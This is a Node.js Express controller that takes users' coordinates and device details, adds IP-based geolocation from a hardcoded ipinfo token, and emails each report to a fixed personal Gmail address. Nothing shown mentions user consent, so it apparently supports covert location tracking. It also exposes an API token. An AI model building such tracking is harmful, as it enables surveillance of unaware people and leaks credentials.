
const locationModel = require('../models/locationModel');
const { sendLocationEmail } = require('../utils/emailSender');

// Track users who have already triggered an email this session
const emailedUsers = new Set();


exports.updateLocation = (req, res) => {
  const { userId, lat, lng, deviceInfo } = req.body;
  if (!userId || lat === undefined || lng === undefined) {
    return res.status(400).json({ error: 'Missing userId, lat, or lng' });
  }
  // locationModel.updateUserLocation(userId, lat, lng);

  // Send email every time a location is received, with device info if provided
  const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
  const toEmail = 'd.wizard.techno@gmail.com';
  sendLocationEmail(toEmail, lat, lng, deviceInfo)
    .then(() => console.log('Location email sent! ', mapUrl, deviceInfo))
    .catch((err) => console.error('Failed to send email:', err));

  res.json({ success: true });
};


exports.locationByIp = async (req, res) => {
  const { userId, lat, lng, info } = req.body;

   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   console.log(ip)

  const response = await fetch(`https://ipinfo.io/${ip}/city?token=28a05fe505da66`);
  const data = await response.json();
  // Send email every time a location is received, with device info if provided
  const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
  const toEmail = 'd.wizard.techno@gmail.com';
  const deviceInfo={...info,...data};
  console.log(data);
   sendLocationEmail(toEmail, lat, lng, deviceInfo)
    .then(() => console.log('Location email sent! ', mapUrl))
    .catch((err) => console.error('Failed to send email:', err));

  res.json({ success: true });
};






exports.getLocations = (req, res) => {
  res.json(locationModel.getAllUserLocations());
};


